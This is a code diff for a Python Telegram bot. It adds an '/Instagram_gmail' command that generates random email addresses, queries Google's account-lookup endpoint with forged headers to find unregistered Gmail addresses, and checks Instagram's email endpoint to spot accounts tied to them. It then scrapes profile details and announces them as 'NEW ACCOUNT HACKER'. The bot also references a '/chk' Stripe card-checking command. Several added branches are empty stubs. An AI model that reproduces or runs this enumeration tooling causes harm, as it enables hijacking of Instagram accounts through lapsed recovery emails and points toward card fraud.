@@ -566,6 +566,87 @@ def start(me):
 				card = me.text.split('/chk ')[1]
 				soon = '\n قريبا سيتم وضع قسم لفحص الباطقات اعتذر جذا لفحص هذه البطاقه'
 				bot.send_message(me.chat.id,text=soon+card,parse_mode = "markdown")
+			elif '/Instagram_gmail'==me.text:
+						gm=0;ya=0;ot=0;ho=0;ao=0;mr=0;bad=0;hit=0;ins=0
+						while True:
+							tk = secrets.token_hex(8)*2
+							sets= ['@gmail.com','@aol.com','@yahoo.com','@mail.ru','@hotmail.com','@outlook.com']
+							domin = random.choice(sets)
+							r = '1234567890'
+							u = str("".join(random.choice(r)for i in range(4)))
+							n0 = names.get_first_name(gender='male')
+							n1 = names.get_first_name()
+							n2 = names.get_first_name(gender='femal')
+							pa2 = n0 + u 
+							pa3 = n1 + u 
+							pa4 = n2 + u
+							ema = Faker().email().split("@")[0]
+							em = (n0,n1,n2,ema,pa2,pa3,pa4)
+							emil = random.choice(em)
+							email = emil+domin
+							user = email.split('@')[0]
+							if (email.split('@')[1])=='gmail.com':
+									email = email
+									user = user
+									url = "https://accounts.google.com/_/lookup/accountlookup?hl=ar&_reqid=404581&rt=j"
+									headers = {'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'ar,en-US;q=0.9,en;q=0.8','content-length': '3893','content-type': 'application/x-www-form-urlencoded;charset=UTF-8','cookie': str(secrets.token_hex(8)*2),'google-accounts-xsrf': '1','origin': 'https://accounts.google.com','referer': 'https://accounts.google.com/AddSession/identifier?service=accountsettings&continue=https%3A%2F%2Fmyaccount.google.com%2F%3Futm_source%3Dsign_in_no_continue&ec=GAlAwAE&flowName=GlifWebSignIn&flowEntry=AddSession','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent': str(generate_user_agent()),'x-chrome-id-consistency-request': '','x-client-data': 'CI22yQEIorbJAQjBtskBCKmdygEIlqzKAQj4x8oBCKTNygEI3NXKAQj69coBCKicywEI1ZzLAQjknMsBCKmdywEIj57LARj6uMoBGNrDygE=','Decoded': 'message ClientVariations{//Active client experiment variation IDs.repeated int32 variation_id = [3300109, 3300130, 3300161, 3313321, 3315222, 3318776, 3319460, 3320540, 3324666, 3329576, 3329621, 3329636, 3329705, 3329807];// Active client experiment variation IDs that trigger server-side behavior.repeated int32 trigger_variation_id = [3316858, 3318234];','x-same-domain': '1'}
+									data = {'continue': 'https://myaccount.google.com/?utm_source=sign_in_no_continue','service': 'accountsettings','f.req': f'["{email}","AEThLlyp7e8ZsnZVwqW6O6dyrUGthqFi3KgSDIKQ-jIN-HJog_ECd1rQ289cSyeWpvYWmjHgASDBl5ljNHwIWNYfM6YFjUr1qawgVmBEBzgob0Tqp3lsbCDkBo1eTwz319csjVy8B_PfeU41-yRSDTdCwDLcX95Y06Q-qmthw5UvWZtR2AO65Hl_j9y3dGOcyYHlcIqelFau_3w5ckfIhsN_OOoDEpBolrsyqKpRbI7l37prdSp7LT-OFMRA8R9t9nv2ozxQqink",[],null,"SA",null,null,2,false,true,[null,null,[2,1,null,1,"https://accounts.google.com/AddSession?service=accountsettings&continue=https%3A%2F%2Fmyaccount.google.com%2F%3Futm_source%3Dsign_in_no_continue&ec=GAlAwAE",null,[],4,[],"GlifWebSignIn",null,[]],10,[null,null,[],null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,[5,"77185425430.apps.googleusercontent.com",["https://www.google.com/accounts/OAuthLogin"],null,null,"85c34cca-3c34-4e5f-9eb6-6b60e8f09b25",null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,5,null,null,[],null,null,null,[],[]],null,null,null,null,null,null,[],null,null,null,[],[]],null,null,null,true],"{email}",null,null,null,true,true,[]]','bgRequest': '["identifier","!fX6lfjLNAAVYPFQiWELoHEqEce7DhzsAKQAjCPxG3Usnx0Mt4oCV2WuMmMPNAmHqjS8FF9FLfr_DNs9Ee3KRD9bnAgAAAPFSAAABJ2gBB5kDxcfo1I4QFOC0hQL4sji6wB59zG3NRM8ajk9u0FF3LfCAAkJXofy8ZwjWcqE3xYQA6L4Yygpo75Cd07R4paBKZkGvT15KsoAADsPpXNQDEbZLd8_becZDkV8NecNncn13sId3_E__Nk5cBe9VNTVkCLgxIojVK-ZAH_YFx1cWWVQbUewGgvk-4e7fmV3PLhQTWSNmgb7CafarU4OV1vxY33ru4p9PFQxYI5uTzwzn5ulBCDZq2z8tfLq2Sk8lWIZzjCGpXgcHiZkf9_rLmfLew7JlZjX7o2ggX6uUIgCuWZ0yGWonvBzfYBvkb8PF5VkBERPSUc05peo8ZXDPkVH0Y8PTEsfovcbXn3HPS_91PtTmg2Mtq1Sv8nm0T155kcHuYJMDUnZoz5N1-HjDjeR73rogzDleiRUq90_2qQ0fXEZa3NX2pqusrK_q7NIGCyaXF-kb82jEaFo_l38UBoA25exc6v3tXudke4CYW8AmSr4DmnGXAgsfdiLjTy6KBStGZSRpjljOJLvsI7NxSOxTSG-NtnzoqAo4_pCJkrcCqfQXgAyF_-giWOZd2LCeVHsXigVCXKYnwPjqwTq6AHnzG8VkNPATaRLTusnIXCYWqE6h6ZW3n3LD-ZMvptZefM5HZR4NdEVTm0yEhCUhJqytGxxGRDppzebgNndVHl2_zVSQXbw84sEJKqzMYS1uieJ-cXhAidCN4vZM9VQDeESLJaPR-khrlYzPL5SzcWSBHH-4AcJOd3zo4c-YiSVSU9LRIduito8MaC4iBpCIQRwmsYvRVlVljCmTMcB-CstK7TH7rw2LfW1rVm79QZvpyCuX0vYdrlWo5lzMuIAtQLyoRxsAUIcHDh9b0SKHboABH9WZQMLcx_7WjqkJ4HTf723AVwrhUREmXcomNWG4m6Yd39kejtb_k_tjzz6eVNuBrP1pV4haQ5zflRsf62e3qYtfeMkzcg8bYrKkQievTXaas7dlUBiJEpfJGrB-1ztmyKRq-c_PvaCjJ1eRURTujrS188v6pd6EXCY0cNprrtXgKWDEMQBTJIBYHTP_9djO7XUdNNMlZsIRwNOaVpjJRXO9i0RpyFh_6EO5paqFdtwaVPYPvNyIfl1rydThZNth3jjrP4UZts5SD5M68SvHZNulr5W5vKKfkE9iY2srgJVQMbkjheXT4rycnwZmLjgVP0b7VZvRsgzV4oSgoG9oa4MV4lz74ELZYJXcYoNnWWXMFP6hSkdjDQzhx8QC4PHmqeSfXlx5YG5gswZocfNcVbXloVBsUlmH"]','at': 'AFoagUXYzuwuqMYsRm5RMqDomQCtdHo6Yg:1613081767804','azt': 'AFoagUWgWYFtaBKM-_bHqckBRCFYh-zFbA:1613081767805','cookiesDisabled': 'false','deviceinfo': '[null,null,null,[],null,"SA",null,null,[],"GlifWebSignIn",null,[null,null,[],null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,[5,"77185425430.apps.googleusercontent.com",["https://www.google.com/accounts/OAuthLogin"],null,null,"85c34cca-3c34-4e5f-9eb6-6b60e8f09b25",null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,5,null,null,[],null,null,null,[],[]],null,null,null,null,null,null,[],null,null,null,[],[]],null,null,null,null,1,null,false]','gmscoreversion': 'undefined','checkConnection': 'youtube:353:0','checkedDomains': 'youtube','pstMsg': '1'}
+									response = requests.post(url, data=data, headers=headers)
+									if (',null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,[]') in response.text:
+										#emll = urllib.parse.quote(email)
+										url = 'https://www.instagram.com/accounts/check_email/'
+										headers ={'Host':'www.instagram.com','content-length':'27','sec-ch-ua':'"Chromium";v="105", "Not)A;Brand";v="8"','x-ig-app-id':'1217981644879628','x-ig-www-claim':'hmac.AR0N6DyPHRuZODwh15vC55Or1-znqJ3K5w6LMfznLWspz1e4','sec-ch-ua-mobile':'?1','x-instagram-ajax':'2c4043b0c5cb','content-type':'application/x-www-form-urlencoded','accept':'*/*','x-requested-with':'XMLHttpRequest','x-asbd-id':'198387','user-agent':'Mozilla/5.0 (Linux; Android 10; YAL-L21) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36','x-csrftoken':'tVf5LI2NxLCqp5lnl9S0rvcWpAdmIH6S','sec-ch-ua-platform':'"Android"','origin':'https://www.instagram.com','sec-fetch-site':'same-origin','sec-fetch-mode':'cors','sec-fetch-dest':'empty','referer':'https://www.instagram.com/accounts/signup/email','accept-encoding':'gzip, deflate, br','accept-language':'en-IQ,en;q=0.9,ar-IQ;q=0.8,ar;q=0.7,en-GB;q=0.6,en-US;q=0.5','cookie':'csrftoken=tVf5LI2NxLCqp5lnl9S0rvcWpAdmIH6S','cookie':'mid=Yzct2AABAAFahrlJIwQ_roYCddrY','cookie':'ig_did=F9626AFD-F0EC-4DA1-898A-A41065957469','cookie':'ig_nrcb=1'}
+										data ={'email':email}
+										req = requests.post(url,headers=headers,data=data).text
+										if' "available":false' and '"email_is_taken"' in req:
+											ins+=1
+											hit+=1
+											req = requests.get(f'https://php-str.herokuapp.com/users.php?user1={user}&user2={user}').json()
+											info = req['results']['instagram']
+											username = info['USERNAME']
+											id = info['ID']
+											name = info['NAME']
+											bio = info['BIO']
+											post = info['POSTS']
+											bio_link = info['BIO_LINK']
+											followers = info['FOLLOWERS']
+											following = info['FOLLOWING']
+											isp = info['PRIVATE']
+											ver = info['VERIFIED']
+											img = info['IMAGE_PROFILE']
+											phone =info['PHONE']
+											email = info['EMAIL']
+											lok = requests.get(f"https://o7aa.pythonanywhere.com/?id={id}")
+											iok = lok.json()
+											date = str(iok['date'])
+											hacker ="https://t.me/z9oon/13"
+											bot.send_video(me.chat.id,hacker,caption= "**NEW ACCOUNT HACKER BY MOHAMMED**\n**EMAIL : **`{}`\n**USERNAME : ** `{}`\n**NAME : **`{}`\n**BIO : **`{}`\n**POST : **`{}`\n**FOLLOWERS : **`{}`\n**FOLLOWING : **`{}`\n**DEVLOPER : BY MOHAMMED ALMUSWI | @ONCLIK**".format(email,username,name,bio,post,followers,following),parse_mode = "markdown")
+										
+			elif '/Instagram_yahoo'==me.text:
+				
+				
+				
+				
+			elif '/Instagram_hotmail'==me.text:
+				
+				
+				
+				
+			elif '/Instagram_aol'==me.text:
+				
+				
+				
+				
+			elif '/Instagram_mailru'==me.text:
+				
+				
+				
+				
+			elif '/Instagram_outlook'==me.text:
+				
+				
+				
+				
 			elif '/comand' in me.text:
 				mess = '/chk to cheack card in stripe \nsend me user instagram example user:\n/ginsta great instagram accounts used proxy \n/start more fuction'
 				bot.send_message(me.chat.id,text=mess,parse_mode = "markdown")
